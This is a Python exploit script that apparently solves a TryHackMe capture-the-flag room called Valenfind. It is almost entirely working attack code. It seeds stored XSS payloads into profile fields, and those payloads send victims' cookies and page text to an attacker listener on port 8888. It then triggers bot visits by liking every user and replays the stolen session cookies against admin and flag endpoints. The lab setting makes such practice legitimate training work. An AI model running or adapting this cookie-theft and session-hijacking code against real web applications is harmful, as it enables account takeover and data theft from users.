"""Valenfind PWN v2: Register fresh -> seed XSS -> like all -> listen -> replay.

Run on AttackBox:  python3 valenfind_pwn.py
"""

import http.server
import random
import re
import socketserver
import string
import threading
import time
import urllib.parse

import requests

# -- Config -----------------------------------------------------------------
BASE = "http://10.112.165.127:5000"
ATTACKER = "10.112.69.178"
LISTEN_PORT = 8888
WAIT_SECONDS = 90
FLAG_RE = re.compile(r"THM\{[^}]+\}")

# -- Stolen cookie storage --------------------------------------------------
STOLEN = []
ALL_FLAGS = []


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        qs = urllib.parse.parse_qs(urllib.parse.urlsplit(self.path).query)
        d = urllib.parse.unquote_plus(qs.get("d", [""])[0])
        t = urllib.parse.unquote_plus(qs.get("t", [""])[0])

        if d:
            print(f"\n{'='*50}")
            print(f"[!!!] CALLBACK RECEIVED!")
            print(f"  cookie : {d[:300]}")
            print(f"  text   : {t[:300]}")
            print(f"{'='*50}")
            if d != "selftest":
                STOLEN.append(d)
            for f in FLAG_RE.findall(d + " " + t):
                if f not in ALL_FLAGS:
                    ALL_FLAGS.append(f)
                    print(f"[FLAG] {f}")

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *_):
        pass


def start_listener():
    srv = socketserver.ThreadingTCPServer(("0.0.0.0", LISTEN_PORT), Handler)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[+] Listener on 0.0.0.0:{LISTEN_PORT}")
    return srv


# -- Helpers ----------------------------------------------------------------
def clean(html: str) -> str:
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", html)).strip()


def check_flags(text: str, src: str):
    for f in FLAG_RE.findall(text):
        if f not in ALL_FLAGS:
            ALL_FLAGS.append(f)
            print(f"[FLAG] ({src}): {f}")


def register_fresh():
    """Register a new account, login, return (session, username, password)."""
    uname = "pwn_" + "".join(random.choices(string.ascii_lowercase, k=6))
    pwd = "Pwn12345!"
    s = requests.Session()

    r = s.post(f"{BASE}/register",
               data={"username": uname, "password": pwd},
               allow_redirects=False, timeout=10)
    print(f"  register -> {r.status_code} (Location: {r.headers.get('Location', '-')})")

    r = s.post(f"{BASE}/login",
               data={"username": uname, "password": pwd},
               allow_redirects=False, timeout=10)
    print(f"  login    -> {r.status_code}")
    print(f"  cookie   : {s.cookies.get('session', '?')[:80]}...")
    return s, uname, pwd


def seed_xss(s: requests.Session):
    """Seed XSS payload into all profile fields."""
    js = (
        "var c=document.cookie||'nocookie';"
        "var t=(document.body?document.body.innerText:'').substring(0,500);"
        f"new Image().src='http://{ATTACKER}:{LISTEN_PORT}/x?d='+encodeURIComponent(c)+'&t='+encodeURIComponent(t)"
    )
    xss_img = f'<img src=x onerror="{js}">'
    xss_svg = f'<svg onload="{js}">'

    # First POST with img
    r = s.post(f"{BASE}/complete_profile", data={
        "real_name": xss_img,
        "email": "pwn@pwn.com",
        "phone": "123456789",
        "address": xss_img,
        "bio": xss_img,
    }, allow_redirects=False, timeout=10)
    print(f"  seed img -> {r.status_code}")

    # Also try via /my_profile POST (edit form)
    r = s.post(f"{BASE}/my_profile", data={
        "real_name": xss_svg,
        "email": "pwn@pwn.com",
        "phone": "123456789",
        "address": xss_svg,
        "bio": xss_svg,
    }, allow_redirects=False, timeout=10)
    print(f"  seed svg via my_profile -> {r.status_code}")


def verify_xss(s: requests.Session, uname: str) -> bool:
    """Check if XSS renders raw in the public profile view."""
    r = s.get(f"{BASE}/profile/{uname}", timeout=10)
    raw = ("onerror" in r.text or "onload" in r.text) and ("<img" in r.text or "<svg" in r.text)
    escaped = "&lt;img" in r.text or "&lt;svg" in r.text
    print(f"  /profile/{uname}: raw={raw}, escaped={escaped}, len={len(r.text)}")
    if raw:
        for tag in ["onerror", "onload"]:
            idx = r.text.find(tag)
            if idx >= 0:
                print(f"    ...{r.text[max(0,idx-20):idx+60]}...")
                break
    return raw


def like_all(s: requests.Session):
    """Like all users visible on dashboard. Uses allow_redirects=False because
    the server returns Location: None (bug) which causes requests to crash."""
    # First get dashboard to find actual like targets
    r = s.get(f"{BASE}/dashboard", timeout=10)
    actions = re.findall(r'action="(/like/\d+)"', r.text)
    print(f"  Dashboard like forms: {actions}")

    if not actions:
        actions = [f"/like/{i}" for i in range(1, 12)]

    for action in actions:
        try:
            r = s.post(f"{BASE}{action}", allow_redirects=False, timeout=10)
            status = r.status_code
            loc = r.headers.get("Location", "-")
            new_cookie = r.headers.get("Set-Cookie", "")[:60]
            print(f"  POST {action} -> {status} (loc={loc}) cookie_updated={'session=' in new_cookie}")
            # Follow redirect manually to dashboard
            if status == 302:
                r2 = s.get(f"{BASE}/dashboard", timeout=10)
                check_flags(r2.text, action)
        except Exception as e:
            print(f"  POST {action} -> error: {e}")


def check_profiles(s: requests.Session):
    """Check all profile pages for flags."""
    r = s.get(f"{BASE}/dashboard", timeout=10)
    profiles = re.findall(r'href="(/profile/[^"]+)"', r.text)
    print(f"  Profile links: {profiles}")

    for p in profiles:
        try:
            r = s.get(f"{BASE}{p}", timeout=10)
            check_flags(r.text, p)
            c = clean(r.text)
            if "thm{" in r.text.lower():
                print(f"  {p}: {c[:300]}")
        except:
            pass


def replay_stolen():
    """Replay stolen cookies against interesting endpoints."""
    paths = ["/", "/dashboard", "/my_profile", "/admin", "/flag",
             "/profile/cupid", "/matches", "/complete_profile"]

    for raw in STOLEN:
        decoded = urllib.parse.unquote_plus(raw)
        print(f"\n  Replaying cookie: {decoded[:100]}...")

        # Extract session value
        m = re.search(r"session=([^;]+)", decoded)
        token = m.group(1).strip() if m else decoded.strip()

        if "nocookie" in token.lower():
            print("  -> HttpOnly cookie, bot JS executed but can't read document.cookie")
            continue

        sr = requests.Session()
        sr.cookies.set("session", token)

        for path in paths:
            try:
                r = sr.get(f"{BASE}{path}", timeout=10, allow_redirects=True)
                if r.status_code == 404 or len(r.text) < 50:
                    continue
                check_flags(r.text, f"replay:{path}")
                c = clean(r.text)
                marker = " ***" if ("thm{" in r.text.lower() or "flag" in c.lower()) else ""
                print(f"    GET {path} -> {r.status_code} ({len(r.text)} bytes){marker}")
                if marker:
                    print(f"      {c[:400]}")
            except:
                pass


def main():
    print("=" * 60)
    print("Valenfind PWN v2")
    print(f"Target:   {BASE}")
    print(f"Attacker: {ATTACKER}:{LISTEN_PORT}")
    print("=" * 60)

    srv = start_listener()

    try:
        # Step 1: Register fresh account
        print("\n[1] Registering fresh account")
        s, uname, pwd = register_fresh()

        # Step 2: Seed XSS
        print("\n[2] Seeding XSS into profile")
        seed_xss(s)

        # Step 3: Verify XSS renders raw
        print("\n[3] Verifying XSS in public profile")
        xss_ok = verify_xss(s, uname)
        if not xss_ok:
            print("  [!] XSS not rendering raw - trying alternate profile URLs")
            for alt in [f"/profile/{uname}", f"/user/{uname}", f"/u/{uname}"]:
                r = s.get(f"{BASE}{alt}", timeout=10)
                if r.status_code == 200 and "onerror" in r.text:
                    print(f"  [+] Found raw XSS at {alt}")
                    xss_ok = True
                    break

        # Step 4: Check profiles for flags
        print("\n[4] Checking all profiles for flags")
        check_profiles(s)

        # Step 5: Like all users to trigger bot visits
        print("\n[5] Liking all users")
        like_all(s)

        # Step 6: Wait for callbacks
        print(f"\n[6] Waiting {WAIT_SECONDS}s for stolen cookies...")
        print(f"  Listener: http://{ATTACKER}:{LISTEN_PORT}")
        deadline = time.time() + WAIT_SECONDS
        while time.time() < deadline:
            if STOLEN:
                print(f"\n  [+] Got {len(STOLEN)} cookie(s)!")
                break
            time.sleep(2)

        if not STOLEN:
            print("  [-] No cookies received")

        # Step 7: Replay stolen cookies
        if STOLEN:
            print("\n[7] Replaying stolen cookies")
            replay_stolen()

    finally:
        srv.shutdown()
        srv.server_close()

    # Summary
    print("\n" + "=" * 60)
    if ALL_FLAGS:
        print("FLAGS FOUND:")
        for f in ALL_FLAGS:
            print(f"  {f}")
    else:
        print("No flags found yet.")
        print(f"Stolen cookies: {len(STOLEN)}")
        print(f"Account: {uname} / {pwd}")
        print("Make sure port 8888 is open on AttackBox!")
    print("=" * 60)


if __name__ == "__main__":
    main()
